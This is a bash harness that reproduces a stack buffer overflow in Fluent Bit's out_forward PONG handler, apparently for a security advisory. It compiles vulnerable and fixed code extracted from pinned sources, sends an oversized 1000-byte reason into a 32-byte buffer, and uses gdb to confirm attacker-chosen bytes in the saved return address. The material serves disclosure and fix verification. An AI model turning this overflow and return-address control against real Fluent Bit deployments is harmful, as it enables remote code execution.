#!/bin/bash
# CVE-2026-61674 / GHSA-jrp8-r9hx-gf73 — Fluent Bit out_forward PONG stack smash.
# Every run re-extracts the complete verbatim secure_forward_pong() from four
# byte-exact pinned forward.c blobs, checks both SHA-256 manifests, builds
# plain and ASan variants, and drives rungs 1-4. No daemon, listener or network.
set -u
cd "$(dirname "$0")" || exit 99
E=evidence
mkdir -p "$E" vuln fixed rel507 rel508
rm -f "$E"/*.out "$E"/*.log "$E"/normalized.txt \
      vuln/*.inc fixed/*.inc rel507/*.inc rel508/*.inc \
      p-vuln p-fixed p-rel507 p-rel508 a-vuln-gcc a-fixed-gcc a-rel508-gcc a-vuln-clang
PASS=0
FAIL=0

ok() { PASS=$((PASS + 1)); printf 'PASS %s\n' "$1"; }
no() { FAIL=$((FAIL + 1)); printf 'FAIL %s\n' "$1"; }
has() {
    if grep -qF "$2" "$1" 2>/dev/null; then ok "$3"; else no "$3"; fi
}
hasnt() {
    if grep -qF "$2" "$1" 2>/dev/null; then no "$3"; else ok "$3"; fi
}
count() {
    if [ "$(grep -cF "$2" "$1" 2>/dev/null)" = "$3" ]; then ok "$4"; else no "$4"; fi
}

# --- verbatim slices: re-extracted from pinned bytes on every run -----------
V=../src/forward.c.47db630c
F=../src/forward.c.45486556
T=../src/forward.c.v5.0.7
R=../src/forward.c.v5.0.8
{ echo '#line 523 "forward.c.47db630c"';   sed -n '523,574p' "$V"; } > vuln/pong_case.inc
{ echo '#line 540 "forward.c.45486556"';   sed -n '540,601p' "$F"; } > fixed/pong_case.inc
{ echo '#line 523 "forward.c.v5.0.7"';     sed -n '523,574p' "$T"; } > rel507/pong_case.inc
{ echo '#line 540 "forward.c.v5.0.8"';     sed -n '540,601p' "$R"; } > rel508/pong_case.inc
(cd ../src && sha256sum -c SHA256SUMS) > "$E/hashcheck.out" 2>&1 \
  && ok "sha256-manifest" || no "sha256-manifest"
count "$E/hashcheck.out" ': OK' 6 'all-6-pinned-files-match'
sha256sum -c SHA256SUMS > "$E/hashcheck-harness.out" 2>&1 \
  && ok "harness-sha256-manifest" || no "harness-sha256-manifest"
count "$E/hashcheck-harness.out" ': OK' 12 'all-12-harness-and-pin-files-match'
count ../src/fix-45486556.patch 'o.via.str.size >= sizeof(msg)' 1 'patch-adds-size-gate'
count ../src/fix-45486556.patch 'o.type != MSGPACK_OBJECT_STR' 1 'patch-adds-pong2-type-check'
count vuln/pong_case.inc 'memcpy(msg, o.via.str.ptr, o.via.str.size);' 1 'vuln-unbounded-memcpy-verbatim'
count rel507/pong_case.inc 'memcpy(msg, o.via.str.ptr, o.via.str.size);' 1 'rel507-unbounded-memcpy-verbatim'
count fixed/pong_case.inc 'o.via.str.size >= sizeof(msg)' 1 'fixed-bounded-copy-present'
count rel508/pong_case.inc 'o.via.str.size >= sizeof(msg)' 1 'rel508-bounded-copy-present'
count vuln/pong_case.inc 'char msg[32] = {0};' 1 'vuln-32-byte-stack-buffer'
count fixed/pong_case.inc 'char msg[32] = {0};' 1 'fixed-32-byte-stack-buffer'

# --- build ------------------------------------------------------------------
build_plain() {
  cc -O0 -g -fno-stack-protector -std=gnu11 $4 \
     -DVARIANT_NAME="\"$2\"" -DPONG_CASE="\"$1\"" -o "$3" driver.c \
     2> "$E/build-$3.log" && ok "build-plain-$3" || no "build-plain-$3"
}
build_asan() {
  cc -O0 -g -std=gnu11 -fsanitize=address -DNO_OOB_READ \
     -DVARIANT_NAME="\"$2\"" -DPONG_CASE="\"$1\"" -o "$3" driver.c \
     2> "$E/build-$3.log" && ok "build-asan-$3" || no "build-asan-$3"
}
build_plain vuln/pong_case.inc   vuln-47db630c   p-vuln    -DSHOW_SMEAR
build_plain fixed/pong_case.inc  fixed-45486556  p-fixed   ""
build_plain rel507/pong_case.inc release-v5.0.7  p-rel507  -DSHOW_SMEAR
build_plain rel508/pong_case.inc release-v5.0.8  p-rel508  ""
build_asan vuln/pong_case.inc    vuln-47db630c   a-vuln-gcc
build_asan fixed/pong_case.inc   fixed-45486556  a-fixed-gcc
build_asan rel508/pong_case.inc  release-v5.0.8  a-rel508-gcc
if command -v clang >/dev/null 2>&1; then
  clang -O0 -g -std=gnu11 -fsanitize=address -DNO_OOB_READ \
     -DVARIANT_NAME='"vuln-47db630c"' -DPONG_CASE='"vuln/pong_case.inc"' \
     -o a-vuln-clang driver.c 2> "$E/build-a-vuln-clang.log" \
     && ok 'build-asan-clang-vuln' || no 'build-asan-clang-vuln'
fi

# --- rung 1: advisory arithmetic, no vulnerable call ------------------------
./p-vuln arith > "$E/arith-vuln.out" 2>&1
has "$E/arith-vuln.out" 'ATTACK_SIZE=1000 DEST_BYTES=32 OVERFLOW_BYTES=968' 'r1-copy-size-vs-destination'

# --- rung 2: vulnerable variants copy, fixed variants reject ---------------
./p-vuln attack 1000 > "$E/plain-vuln-attack.out" 2>&1 || true
has "$E/plain-vuln-attack.out" 'VARIANT=vuln-47db630c MODE=attack REASON_SIZE=1000 DEST_BYTES=32 OVERFLOW_BYTES=968' 'r2-1000-byte-reason-accepted'
has "$E/plain-vuln-attack.out" 'FLB_ERROR_CALLS=1 MSG_BYTE31=41' 'r2-attacker-byte-in-destination'
has "$E/plain-vuln-attack.out" 'OBS_OFFSET_0=41 OBS_OFFSET_17=5a OBS_OFFSET_24=7a OBS_OFFSET_33=3c OBS_OFFSET_40=7b OBS_OFFSET_48=42 OBS_OFFSET_56=7b OBS_OFFSET_63=41' 'r4-chosen-bytes-at-chosen-offsets'
./p-rel507 attack 1000 > "$E/plain-rel507-attack.out" 2>&1 || true
has "$E/plain-rel507-attack.out" 'VARIANT=release-v5.0.7 MODE=attack REASON_SIZE=1000' 'r2-affected-release-v5.0.7'
has "$E/plain-rel507-attack.out" 'OBS_OFFSET_17=5a OBS_OFFSET_24=7a OBS_OFFSET_33=3c OBS_OFFSET_40=7b' 'r4-affected-release-chosen-bytes'
./p-fixed attack 1000 > "$E/plain-fixed-attack.out" 2>&1 || true
has "$E/plain-fixed-attack.out" 'FLB_ERROR_CALLS=1 MSG_BYTE31=00' 'fixed-bounded-copy-nul-terminated'
hasnt "$E/plain-fixed-attack.out" 'MSG_BYTE31=41' 'fixed-no-attacker-byte-past-31'
./p-rel508 attack 1000 > "$E/plain-rel508-attack.out" 2>&1 || true
has "$E/plain-rel508-attack.out" 'FLB_ERROR_CALLS=1 MSG_BYTE31=00' 'rel508-bounded-copy-nul-terminated'

# --- rung 4: gdb shows the chosen saved RIP after the overflow -------------
if command -v gdb >/dev/null 2>&1; then
  gdb -q -batch -ex 'break forward.c.47db630c:568' -ex 'run attack 1000' \
      -ex 'info frame' -ex 'x/64xb &msg' -ex 'continue' -ex 'bt 3' ./p-vuln \
      > "$E/gdb-frame-raw.txt" 2>&1
  sed -E 's#/home/[^ ]*/harness/#HARNESS/#g; s/0x7fff[0-9a-f]+/0xSTACK/g; s/0x5555[0-9a-f]+/0xCODE/g; s/==[0-9]+==/==PID==/g' \
      "$E/gdb-frame-raw.txt" > "$E/gdb-frame.out"
  has "$E/gdb-frame.out" 'saved rip = 0x414141414141417b' 'r4-gdb-saved-rip-chosen-byte'
  has "$E/gdb-frame.out" 'Stack level 0, frame at' 'r4-gdb-frame-inspected'
  has "$E/gdb-frame.out" '0x5a' 'r4-gdb-stack-chosen-byte-5a'
  has "$E/gdb-frame.out" '0x414141414141417b in' 'r4-gdb-backtrace-chosen-rip'
fi

# --- rung 3: ASan WRITE of 1000 past the 32-byte stack object ---------------
./a-vuln-gcc attack 1000 > "$E/vuln-gcc-asan.out" 2>&1 || true
has "$E/vuln-gcc-asan.out" 'ERROR: AddressSanitizer: stack-buffer-overflow' 'r3-gcc-asan-overflow'
has "$E/vuln-gcc-asan.out" 'WRITE of size 1000' 'r3-gcc-asan-write1000'
has "$E/vuln-gcc-asan.out" 'forward.c.47db630c:567' 'r3-gcc-asan-at-pinned-line-567'
has "$E/vuln-gcc-asan.out" 'in secure_forward_pong' 'r3-gcc-asan-in-function'
has "$E/vuln-gcc-asan.out" "'msg' (line 526)" 'r3-gcc-asan-msg-object'
if [ -x a-vuln-clang ]; then
  ./a-vuln-clang attack 1000 > "$E/vuln-clang-asan.out" 2>&1 || true
  has "$E/vuln-clang-asan.out" 'ERROR: AddressSanitizer: stack-buffer-overflow' 'r3-clang-asan-overflow'
  has "$E/vuln-clang-asan.out" 'WRITE of size 1000' 'r3-clang-asan-write1000'
  has "$E/vuln-clang-asan.out" 'forward.c.47db630c:567' 'r3-clang-asan-at-pinned-line-567'
fi
./a-fixed-gcc attack 1000 > "$E/fixed-gcc-asan.out" 2>&1 || true
hasnt "$E/fixed-gcc-asan.out" 'ERROR: AddressSanitizer' 'fixed-asan-clean'
has "$E/fixed-gcc-asan.out" 'FLB_ERROR_CALLS=1 MSG_BYTE31=00' 'fixed-asan-bounded-copy'
./a-rel508-gcc attack 1000 > "$E/rel508-gcc-asan.out" 2>&1 || true
hasnt "$E/rel508-gcc-asan.out" 'ERROR: AddressSanitizer' 'rel508-asan-clean'

# --- safe control: a 4-byte reason is in bounds in every variant -----------
for B in p-vuln p-fixed p-rel507 p-rel508 a-vuln-gcc a-fixed-gcc a-rel508-gcc; do
  ./"$B" safe > "$E/safe-${B}.out" 2>&1 || true
  has "$E/safe-${B}.out" 'FLB_ERROR_CALLS=1 MSG_BYTE31=00' "safe-${B}-formats-normally"
  hasnt "$E/safe-${B}.out" 'OBS_OFFSET_17=5a' "safe-${B}-no-chosen-byte-past-32"
  hasnt "$E/safe-${B}.out" 'ERROR: AddressSanitizer' "safe-${B}-asan-clean"
done

# --- deterministic normalized trace: no PID, address, path or build id ------
{
  cat "$E"/arith-vuln.out "$E"/plain-vuln-attack.out "$E"/plain-fixed-attack.out \
      "$E"/plain-rel507-attack.out "$E"/plain-rel508-attack.out \
      "$E"/vuln-gcc-asan.out "$E"/vuln-clang-asan.out \
      "$E"/fixed-gcc-asan.out "$E"/rel508-gcc-asan.out 2>/dev/null
} | sed -E 's#/[^ ]*/fluentbit2shell/harness/#HARNESS/#g; s#/[^ ]*/harness/#HARNESS/#g; s/BuildId: [0-9a-f]+/BuildId: BUILDID/g; s/0x[0-9a-f]+/0xADDR/g; s/#[0-9]+ /#FRAME /g; s/==[0-9]+==/==PID==/g' > "$E/normalized.txt"
TRACE=$(sha256sum "$E/normalized.txt" | cut -d' ' -f1)
printf 'TRACE_SHA256=%s\n' "$TRACE"

printf 'PASS=%d FAIL=%d\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
